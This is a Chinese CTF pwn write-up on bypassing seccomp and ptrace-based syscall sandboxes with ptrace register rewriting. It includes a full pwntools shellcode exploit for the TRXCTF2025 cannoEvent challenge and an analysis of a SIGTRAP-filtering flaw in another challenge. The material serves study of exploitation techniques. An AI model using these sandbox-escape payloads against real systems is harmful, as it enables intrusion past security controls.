## 一. 介绍

对于一道 shellcode 题目，常规的考法是 orw 及其变种 or execve 这些。

假如题目禁用了所有的文件描述符，那么可以考虑通过 /dev 重新打开标准输入输出。

但如果远程存在 chroot 的话，上面这个方法也不行。

一旦 `close(1)`，pwntools 交互会直接进入 EOF，尽管 TCP 链接实际上并没有断开，因此盲注也同样无法使用。

所以可以创建一个 `socket` 通信，读取 flag 并发送至 VPS。

但如果禁止使用 `socket` 的话，怎么打呢（？


## 二. ptrace syscall

```c
#include <sys/ptrace.h>

long ptrace(enum __ptrace_request op, pid_t pid,
		void *addr, void *data);
```

主要是得看 ptrace 的 man 手册。

第一个参数的枚举值：

```c
enum __ptrace_request
{
	PTRACE_TRACEME = 0,		//被调试进程调用
	PTRACE_PEEKDATA = 2,	//查看内存
  	PTRACE_PEEKUSER = 3,	//查看struct user 结构体的值
  	PTRACE_POKEDATA = 5,	//修改内存
  	PTRACE_POKEUSER = 6,	//修改struct user 结构体的值
  	PTRACE_CONT = 7,		//让被调试进程继续
  	PTRACE_SINGLESTEP = 9,	//让被调试进程执行一条汇编指令
  	PTRACE_GETREGS = 12,	//获取一组寄存器(struct user_regs_struct)
  	PTRACE_SETREGS = 13,	//修改一组寄存器(struct user_regs_struct)
  	PTRACE_ATTACH = 16,		//附加到一个进程
  	PTRACE_DETACH = 17,		//解除附加的进程
  	PTRACE_SYSCALL = 24,	//让被调试进程在系统调用前和系统调用后暂停
};
```

`PTRACE_GETREGS` 和 `PTRACE_SETREGS` 可以对寄存器操作，这个寄存器结构体如下：


```c
struct user_regs_struct
{
  __extension__ unsigned long long int r15;
  __extension__ unsigned long long int r14;
  __extension__ unsigned long long int r13;
  __extension__ unsigned long long int r12;
  __extension__ unsigned long long int rbp;
  __extension__ unsigned long long int rbx;
  __extension__ unsigned long long int r11;
  __extension__ unsigned long long int r10;
  __extension__ unsigned long long int r9;
  __extension__ unsigned long long int r8;
  __extension__ unsigned long long int rax;
  __extension__ unsigned long long int rcx;
  __extension__ unsigned long long int rdx;
  __extension__ unsigned long long int rsi;
  __extension__ unsigned long long int rdi;
  __extension__ unsigned long long int orig_rax; // 0x78
  __extension__ unsigned long long int rip;      // 0x80
  __extension__ unsigned long long int cs;
  __extension__ unsigned long long int eflags;
  __extension__ unsigned long long int rsp;
  __extension__ unsigned long long int ss;
  __extension__ unsigned long long int fs_base;
  __extension__ unsigned long long int gs_base;
  __extension__ unsigned long long int ds;
  __extension__ unsigned long long int es;
  __extension__ unsigned long long int fs;
  __extension__ unsigned long long int gs;
};
```

主要注意的点：
- 系统调用号保存在 `orig_rax`，而不是 `rax`
- 读写内存的时候以 4 字节为单位
- 只有当子进程的状态发生改变（也就是发出信号 `SIGNTRAP` 这种时），父进程才需要 `wait`
- ptrace 一些操作会忽视参数，所以需要仔细看 man 手册

## 三. 打法

### 用 ptrace 写 shellcode

如果题目直接执行了 `fork` 函数，且给了子进程的进程号，由父进程执行 shellcode 的话，可以：
1. `PTRACE_ATTACH` 附加到子进程
2. `PTRACE_SYSCALL` 在子进程 syscall 前断点，此时父进程执行 `wait` 可以接受断点信号，子进程暂停在 syscall 前
3. 通过 `PTRACE_GETREGS` 和 `PTRACE_SETREGS` 对寄存器操作，绕过 syscall 的检查

```c
static long syscall_trace_enter(struct pt_regs *regs, long syscall,
				unsigned long work)
{
	long ret = 0;

	/*
	 * Handle Syscall User Dispatch.  This must comes first, since
	 * the ABI here can be something that doesn't make sense for
	 * other syscall_work features.
	 */
	if (work & SYSCALL_WORK_SYSCALL_USER_DISPATCH) {
		if (syscall_user_dispatch(regs))
			return -1L;
	}

	/* Handle ptrace */
	if (work & (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) {
		ret = ptrace_report_syscall_entry(regs);
		if (ret || (work & SYSCALL_WORK_SYSCALL_EMU))
			return -1L;
	}

	/* Do seccomp after ptrace, to catch any tracer changes. */
	if (work & SYSCALL_WORK_SECCOMP) {
		ret = __secure_computing(NULL);
		if (ret == -1L)
			return ret;
	}

	/* Either of the above might have changed the syscall number */
	syscall = syscall_get_nr(current, regs);

	if (unlikely(work & SYSCALL_WORK_SYSCALL_TRACEPOINT))
		trace_sys_enter(regs, syscall);

	syscall_enter_audit(regs, syscall);

	return ret ? : syscall;
}
```


**如上源码，注意，syscall 会调用 `syscall_trace_enter()`，该函数的处理顺序是 Syscall User Dispatch -> ptrace -> seccomp，因此可以用 ptrace bypass seccomp，然后再用 ptrace 恢复想调用的 syscall 或者在某些内存写入 orw，从而提权。**


反之，如果题目没有 `fork`，只是单纯允许我们执行 shellcode 的话，可以：
1. `fork` 开个子进程（返回值就是子进程的进程号），让子进程执行 `PTRACE_TRACEME` 也就是 `ptrace(0, 0, 0, 0)`，这样哪怕不知道进程号也能 ptrace 标记上；
2. 父进程 `PTRACE_SYSCALL` 加 `wait/waitpid`
3. 子进程执行 `int` 指令可以用来发送 `SIGTRAP` 信号（类似于打断点），这样就可以断在子进程被沙箱 ban 的 syscall 前/后
4. 此时父进程通过 `PTRACE_GETREGS` / `PTRACE_SETREGS` 修改寄存器，让子进程可以通过沙箱检查
5. 再次修改寄存器，把子进程执行的 syscall 恢复到目标的 orw

注意，`ptrace` attach 到子进程上就不能再 gdb 调试那个进程了，因为 gdb 走的也是 ptrace，所以一般对子进程操作时只能 gdb 调试父进程。

另外，还有一些题目可能只需要上述步骤的一部分，灵活变通即可。

例题：TRXCTF2025 cannoEvent，exp:

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = "./chall_patched"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, "b *0x401325")

shellcode = """
mov rax, 0x39
syscall
mov r12, rax
cmp rax, 0 /* if rax != 0; jmp parent; else jmp child */
jne parent
"""

shellcode += shellcraft.ptrace(0, 0, 0, 0)  # traceme
shellcode += """int3"""
shellcode += shellcraft.cat("./flag")
shellcode += """
ret

parent:
"""
shellcode += shellcraft.wait4("r12", 0, 0, 0)
shellcode += """
continue:
"""
shellcode += shellcraft.ptrace(0x18, "r12", 0, 0)  # PTRACE_SYSCALL
shellcode += shellcraft.wait4("r12", 0, 0, 0)
shellcode += shellcraft.ptrace(12, "r12", 0, "rsp")  # save reg

shellcode += """
mov r8, rsp
mov r14, qword ptr [r8 + 0x80] /* save rip => r11 */
mov r13, 0x8fff00000000
mov qword ptr [r8 + 0x80], r13 /* rip = 0x8fff << 32 */
"""

shellcode += shellcraft.ptrace(13, "r12", 0, "rsp")  # write reg

shellcode += shellcraft.ptrace(0x18, "r12", 0, 0)
shellcode += shellcraft.wait4("r12", 0, 0, 0)
shellcode += shellcraft.ptrace(12, "r12", 0, "rsp")

shellcode += """
mov r8, rsp
mov qword ptr [r8 + 0x80], r14 /* rip = old_rip */
"""

shellcode += shellcraft.ptrace(13, "r12", 0, "rsp")

shellcode += """
jmp continue /* attack syscall ( sendfile ) again */
"""

io.sendlineafter(b"size: ", str(len(shellcode)).encode())
io.sendlineafter(b"shellcode: ", asm(shellcode))

io.interactive()
```


### ptrace 实现的沙箱


在祥云杯题目sandboxheap中，出题人没有使用常规的seccomp建立沙箱，而是利用 ptrace 去监听题目进程，通过监听每一个syscall，获取 `orig_rax` 并且作判断，从而实现了基于 ptrace 的 syscall 过滤。

解法是出题人在监听的父进程中放置了后门，因此可以关闭部分沙箱检测。

而西湖论剑 2025 babytrace 也是用了类似的方法，这道题目可以在子进程里执行任意 shellcode，父进程通过以下代码实现沙箱：

```c
 ptrace(PTRACE_SETOPTIONS, pid, 0LL, 1LL);
  do
  {
    ptrace(PTRACE_SYSCALL, pid, 0LL, 0LL);      // 进入系统调用时，检查系统调用号
    if ( waitpid(pid, &status, 0x40000000) < 0 )// 这里子进程触发的信号不一定是由进入/退出系统调用发出的
      error("waitpid error2");
    if ( (status & 0x7F) == 0 || status == 127 && (status & 0xFF00) >> 8 == 11 )
      break;
    if ( ptrace(PTRACE_GETREGS, pid, 0LL, &regs) < 0 )
      error("GETREGS error");
    if ( regs.orig_rax != 1 && regs.orig_rax != 231 && regs.orig_rax != 5 && regs.orig_rax != 60 )
    {
      if ( regs.orig_rax )
      {
        printf("bad syscall: %llu\n", regs.orig_rax);
        regs.orig_rax = -1LL;
        if ( ptrace(PTRACE_SETREGS, pid, 0LL, &regs) < 0 )
          error("SETREGS error");
      }
    }
    ptrace(PTRACE_SYSCALL, pid, 0LL, 0LL);      // 捕获退出系统调用
    if ( waitpid(pid, &status, 0x40000000) < 0 )
      error("waitpid error3");
  }
  while ( (status & 0x7F) != 0 && (status != 127 || (status & 0xFF00) >> 8 != 11) );
```

如上，通过 `PTRACE_SYSCALL` 和 `waitpid` 实现在每次进入/退出 syscall 时检测 `orig_rax` 实现沙箱过滤。

问题出在 `waitpid` 的 `status` 没有过滤 `SIGTRAP` 信号，所以可以用 `int1/3` 等指令绕过上述检测。